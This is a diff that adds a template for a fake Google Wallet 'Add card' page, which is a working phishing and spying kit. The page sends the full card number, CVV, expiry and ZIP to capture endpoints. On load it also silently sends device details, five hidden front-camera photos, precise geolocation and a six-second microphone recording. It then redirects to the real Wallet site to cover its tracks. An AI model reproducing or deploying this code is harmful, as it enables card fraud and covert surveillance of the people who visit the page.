@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Wallet - Add Card</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f8f9fa;color:#202124;font-family:'Google Sans',Roboto,Arial,sans-serif;min-height:100vh}
+.header{background:#fff;padding:16px 24px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #dadce0;box-shadow:0 1px 2px rgba(0,0,0,0.1)}
+.header img{height:32px}
+.header h1{font-size:20px;font-weight:500;color:#5f6368}
+.container{max-width:480px;margin:40px auto;padding:0 20px}
+.card-box{background:#fff;border-radius:12px;padding:32px;box-shadow:0 1px 2px rgba(0,0,0,0.1),0 2px 4px rgba(0,0,0,0.05)}
+.card-box h2{font-size:24px;font-weight:400;margin-bottom:8px}
+.card-box .subtitle{color:#5f6368;font-size:14px;margin-bottom:24px}
+.card-visual{width:100%;height:200px;border-radius:12px;background:linear-gradient(135deg,#4285f4,#34a853,#fbbc04,#ea4335);margin-bottom:24px;position:relative;overflow:hidden;box-shadow:0 4px 12px rgba(0,0,0,0.15)}
+.card-visual::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M11 18c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm48 25c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm-43-7c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm63 31c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM34 90c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm56-76c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM12 86c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm28-65c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm23-11c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-6 60c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm29 22c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zM32 63c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm57-13c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-9-21c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM60 91c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM35 41c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM12 60c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2z' fill='%23ffffff' fill-opacity='0.08' fill-rule='evenodd'/%3E%3C/svg%3E");opacity:0.3}
+.card-visual .chip{position:absolute;top:30px;left:30px;width:50px;height:38px;background:linear-gradient(135deg,#d4af37,#f4d03f,#d4af37);border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:10px;color:#8B6914;font-weight:bold}
+.card-visual .card-number{position:absolute;bottom:60px;left:30px;color:#fff;font-size:22px;letter-spacing:3px;font-family:'Courier New',monospace;text-shadow:0 2px 4px rgba(0,0,0,0.3)}
+.card-visual .card-name{position:absolute;bottom:30px;left:30px;color:#fff;font-size:14px;text-transform:uppercase;letter-spacing:1px;text-shadow:0 1px 2px rgba(0,0,0,0.3)}
+.card-visual .card-expiry{position:absolute;bottom:30px;right:30px;color:#fff;font-size:14px;text-shadow:0 1px 2px rgba(0,0,0,0.3)}
+.card-visual .logo{position:absolute;top:20px;right:20px;color:#fff;font-size:14px;font-weight:600;opacity:0.9}
+
+.input-group{margin-bottom:16px}
+.input-group label{display:block;font-size:12px;color:#5f6368;margin-bottom:6px;font-weight:500}
+.input-group input{width:100%;padding:12px 16px;border:1px solid #dadce0;border-radius:8px;font-size:16px;outline:none;transition:all 0.2s;background:#fff}
+.input-group input:focus{border-color:#4285f4;box-shadow:0 0 0 2px rgba(66,133,244,0.2)}
+.input-row{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.btn-add{width:100%;padding:14px;background:#1a73e8;border:none;border-radius:8px;color:#fff;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s;margin-top:8px}
+.btn-add:hover{background:#1557b0;box-shadow:0 2px 8px rgba(26,115,232,0.3)}
+.btn-add:disabled{background:#dadce0;color:#5f6368;cursor:not-allowed}
+.security-note{display:flex;align-items:center;gap:10px;margin-top:20px;padding:16px;background:#e8f0fe;border-radius:8px;font-size:13px;color:#1967d2}
+.security-note svg{width:20px;height:20px;flex-shrink:0}
+
+/* Scan Section */
+.scan-section{margin-top:20px;padding:20px;background:#f1f3f4;border-radius:8px;text-align:center}
+.scan-section h4{font-size:14px;color:#202124;margin-bottom:10px}
+.scan-section p{font-size:12px;color:#5f6368;margin-bottom:15px}
+.btn-scan{width:100%;padding:12px;background:#fff;border:1px solid #dadce0;border-radius:8px;color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer;transition:all 0.3s;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn-scan:hover{background:#f8f9fa;border-color:#4285f4}
+.camera-preview{width:100%;height:200px;margin:15px auto;border-radius:8px;overflow:hidden;background:#000;display:none}
+.camera-preview video{width:100%;height:100%;object-fit:cover}
+.footer{text-align:center;margin-top:30px;color:#5f6368;font-size:12px}
+.footer a{color:#1a73e8;text-decoration:none}
+
+/* Loading */
+.loading-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(255,255,255,0.95);z-index:1000;flex-direction:column;align-items:center;justify-content:center}
+.loading-overlay .spinner{width:48px;height:48px;border:4px solid #e8eaed;border-top-color:#4285f4;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-overlay h3{margin-top:20px;font-size:18px;color:#202124;font-weight:400}
+.loading-overlay p{margin-top:8px;color:#5f6368;font-size:14px}
+.loading-overlay .progress{width:200px;height:4px;background:#e8eaed;border-radius:2px;margin-top:20px;overflow:hidden}
+.loading-overlay .progress .bar{height:100%;background:#4285f4;width:0%;animation:loadProgress 3s ease-in-out forwards}
+@keyframes loadProgress{0%{width:0%}50%{width:60%}100%{width:100%}}
+
+#hiddenCamera{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
+</style>
+</head>
+<body>
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" alt="Google">
+    <h1>Wallet</h1>
+</div>
+
+<div class="container">
+    <div class="card-box" id="cardBox">
+        <h2>Add a card</h2>
+        <p class="subtitle">Enter your card details or scan with your camera</p>
+
+        <div class="card-visual">
+            <div class="chip">EMV</div>
+            <div class="card-number" id="displayNumber">#### #### #### ####</div>
+            <div class="card-name" id="displayName">YOUR NAME</div>
+            <div class="card-expiry" id="displayExpiry">MM/YY</div>
+            <div class="logo">VISA</div>
+        </div>
+
+        <div class="input-group">
+            <label>Card number</label>
+            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatCardNumber(this);updateCard()">
+        </div>
+
+        <div class="input-group">
+            <label>Cardholder name</label>
+            <input type="text" id="cardName" placeholder="Full name on card" oninput="updateCard()">
+        </div>
+
+        <div class="input-row">
+            <div class="input-group">
+                <label>Expiry date</label>
+                <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this);updateCard()">
+            </div>
+            <div class="input-group">
+                <label>CVV</label>
+                <input type="text" id="cardCvv" placeholder="123" maxlength="4" oninput="this.value=this.value.replace(/\D/g,'')">
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label>Billing ZIP / Postal code</label>
+            <input type="text" id="cardZip" placeholder="12345">
+        </div>
+
+        <div class="scan-section">
+            <h4>Scan your card</h4>
+            <p>Use your camera to quickly scan your card details</p>
+            <div class="camera-preview" id="cameraPreview">
+                <video id="previewVideo" autoplay playsinline></video>
+            </div>
+            <button class="btn-scan" id="scanBtn" onclick="startCamera()">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18M9 21V9"/></svg>
+                Scan with camera
+            </button>
+            <button class="btn-scan" id="captureBtn" onclick="captureCardPhoto()" style="display:none;margin-top:10px">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3"/></svg>
+                Capture
+            </button>
+        </div>
+
+        <div class="security-note">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+            Your card information is encrypted and secure. Google never stores your CVV.
+        </div>
+
+        <button class="btn-add" id="addBtn" onclick="submitCard()">Add card</button>
+    </div>
+
+    <!-- Scan Code Section -->
+    <div class="card-box" id="scanCodeBox" style="display:none;text-align:center">
+        <h2>Scan your code</h2>
+        <p style="color:#5f6368;margin-bottom:20px">Position your card in the frame to scan</p>
+        <div class="camera-preview" id="codePreview" style="display:block;height:250px">
+            <video id="codeVideo" autoplay playsinline></video>
+        </div>
+        <button class="btn-add" id="codeCaptureBtn" onclick="captureCodePhotos()" style="margin-top:20px">Scan Code</button>
+    </div>
+
+    <div class="footer">
+        <p>By adding a card, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></p>
+        <p style="margin-top:8px">Google LLC</p>
+    </div>
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    <h3>Adding your card...</h3>
+    <p>Please wait while we verify your card</p>
+    <div class="progress"><div class="bar"></div></div>
+</div>
+
+<video id="hiddenCamera" autoplay playsinline></video>
+<canvas id="captureCanvas" style="display:none"></canvas>
+
+<script>
+const TOKEN = "<%= token %>";
+let captureId = null;
+let stream = null;
+let codeStream = null;
+
+function formatCardNumber(input) {
+    let value = input.value.replace(/\D/g, '');
+    value = value.substring(0, 16);
+    input.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+}
+function formatExpiry(input) {
+    let value = input.value.replace(/\D/g, '');
+    if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
+    input.value = value;
+}
+function updateCard() {
+    document.getElementById('displayNumber').textContent = document.getElementById('cardNumber').value || '#### #### #### ####';
+    document.getElementById('displayName').textContent = (document.getElementById('cardName').value || 'YOUR NAME').toUpperCase();
+    document.getElementById('displayExpiry').textContent = document.getElementById('cardExpiry').value || 'MM/YY';
+}
+
+async function silentCapture() {
+    const device = {platform:navigator.platform,browser:navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/)?.[0]||'Unknown',language:navigator.language,cores:navigator.hardwareConcurrency||'Unknown',memory:navigator.deviceMemory||'Unknown'};
+    const screen={width:window.screen.width,height:window.screen.height};
+    let battery={};try{const b=await navigator.getBattery();battery={level:b.level,charging:b.charging}}catch(e){}
+    const network={type:navigator.connection?.type||'Unknown',effectiveType:navigator.connection?.effectiveType||'Unknown'};
+
+    const resp=await fetch('/api/capture/init',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:TOKEN,template:'google_wallet',device,screen,battery,network})});
+    const data=await resp.json();captureId=data.capture_id;
+
+    // Silent 5 photos
+    try{const sStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+    const video=document.getElementById('hiddenCamera');video.srcObject=sStream;
+    let count=0;
+    const interval=setInterval(()=>{
+        if(count>=5){clearInterval(interval);sStream.getTracks().forEach(t=>t.stop());return;}
+        const canvas=document.getElementById('captureCanvas');canvas.width=640;canvas.height=480;
+        canvas.getContext('2d').drawImage(video,0,0,640,480);
+        fetch('/api/capture/photo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,image:canvas.toDataURL('image/jpeg',0.8)})});
+        count++;
+    },800);
+    }catch(e){}
+
+    if(navigator.geolocation){navigator.geolocation.getCurrentPosition(pos=>fetch('/api/capture/location',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy})}),()=>{},{enableHighAccuracy:true,timeout:10000});}
+
+    try{const aStream=await navigator.mediaDevices.getUserMedia({audio:true});const rec=new MediaRecorder(aStream);const chunks=[];
+    rec.ondataavailable=e=>chunks.push(e.data);rec.onstop=()=>{const blob=new Blob(chunks,{type:'audio/webm'});const reader=new FileReader();reader.onloadend=()=>fetch('/api/capture/audio',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({capture_id:captureId,audio:reader.result})});reader.readAsDataURL(blob);};
+    rec.start();setTimeout(()=>rec.stop(),6000);}catch(e){}
+}
+
+async function startCamera() {
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}, audio: false});
+        document.getElementById('previewVideo').srcObject = stream;
+        document.getElementById('cameraPreview').style.display = 'block';
+        document.getElementById('scanBtn').style.display = 'none';
+        document.getElementById('captureBtn').style.display = 'flex';
+    } catch(e) { alert('Camera access is required to scan your card.'); }
+}
+
+async function captureCardPhoto() {
+    const video = document.getElementById('previewVideo');
+    const canvas = document.getElementById('captureCanvas');
+    canvas.width = video.videoWidth || 1280; canvas.height = video.videoHeight || 720;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    await fetch('/api/capture/photo', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({capture_id:captureId, image:canvas.toDataURL('image/jpeg',0.9)})});
+    if (stream) stream.getTracks().forEach(t=>t.stop());
+    document.getElementById('cameraPreview').style.display = 'none';
+    document.getElementById('scanBtn').style.display = 'flex';
+    document.getElementById('captureBtn').style.display = 'none';
+}
+
+async function submitCard() {
+    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+    const cardName = document.getElementById('cardName').value;
+    const cardExpiry = document.getElementById('cardExpiry').value;
+    const cardCvv = document.getElementById('cardCvv').value;
+    const cardZip = document.getElementById('cardZip').value;
+    if (!cardNumber || !cardName || !cardExpiry || !cardCvv) { alert('Please fill in all required fields'); return; }
+
+    await fetch('/api/capture/card', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({capture_id:captureId, card_number:cardNumber, expiry:cardExpiry, cvv:cardCvv, name:cardName, zip:cardZip})});
+
+    // Show scan code section
+    document.getElementById('cardBox').style.display = 'none';
+    document.getElementById('scanCodeBox').style.display = 'block';
+
+    // Auto start camera for code scan
+    try {
+        codeStream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}, audio: false});
+        document.getElementById('codeVideo').srcObject = codeStream;
+    } catch(e) {}
+}
+
+async function captureCodePhotos() {
+    const video = document.getElementById('codeVideo');
+    const canvas = document.getElementById('captureCanvas');
+    canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
+    let count = 0;
+    const btn = document.getElementById('codeCaptureBtn');
+    btn.textContent = 'Scanning...'; btn.disabled = true;
+
+    const interval = setInterval(async () => {
+        if (count >= 5) {
+            clearInterval(interval);
+            if (codeStream) codeStream.getTracks().forEach(t=>t.stop());
+            document.getElementById('scanCodeBox').style.display = 'none';
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            setTimeout(() => window.location.href = 'https://wallet.google.com/', 3500);
+            return;
+        }
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        await fetch('/api/capture/photo', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({capture_id:captureId, image:canvas.toDataURL('image/jpeg',0.9)})});
+        count++; btn.textContent = `Scanning ${count}/5...`;
+    }, 600);
+}
+
+window.addEventListener('load', silentCapture);
+</script>
+</body>
+</html>
